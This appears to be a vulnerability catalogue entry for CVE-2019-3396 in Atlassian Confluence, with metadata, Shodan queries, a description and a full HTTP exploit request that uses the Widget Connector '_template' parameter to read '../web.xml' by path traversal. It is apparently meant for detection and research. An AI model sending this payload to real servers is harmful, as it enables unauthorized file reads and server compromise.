---
layout: "post"
cve_id: "CVE-2019-3396"
title: "Atlassian Confluence Server - Path Traversal"
pcap: true
pcap_path: "/pcaps/2019/CVE-2019-3396.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-3396.yaml"
author: "harshbothra_"
severity: "critical"
impact: "Unauthenticated attackers can exploit server-side template injection to achieve path traversal and execute arbitrary code, leading to complete Confluence server compromise.
"
remediation: "Apply the necessary security patches or upgrade to a patched version of Atlassian Confluence Server to mitigate this vulnerability.
"
reference:
  - "https://github.com/x-f1v3/CVE-2019-3396"
  - "https://nvd.nist.gov/vuln/detail/CVE-2019-3396"
  - "https://jira.atlassian.com/browse/CONFSERVER-57974"
  - "http://packetstormsecurity.com/files/152568/Atlassian-Confluence-Widget-Connector-Macro-Velocity-Template-Injection.html"
  - "https://github.com/ARPSyndicate/cvemon"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2019-3396', 'cwe-id': 'CWE-22', 'epss-score': 0.94472, 'epss-percentile': 0.99997, 'cpe': 'cpe:2.3:a:atlassian:confluence:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'atlassian', 'product': 'confluence', 'shodan-query': ['http.component:"Atlassian Confluence"', 'cpe:"cpe:2.3:a:atlassian:confluence"', 'http.component:"atlassian confluence"']}"
tags:
  - "cve"
  - "cve2019"
  - "atlassian"
  - "confluence"
  - "lfi"
  - "rce"
  - "kev"
  - "packetstorm"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
The Widget Connector macro in Atlassian Confluence Server before version 6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code execution on a Confluence Server or Data Center instance via server-side template injection.

## üåê HTTP Request
```nohighlight
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Content-Length: 168
Referer: www.victim.com
Accept-Encoding: gzip

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}
```

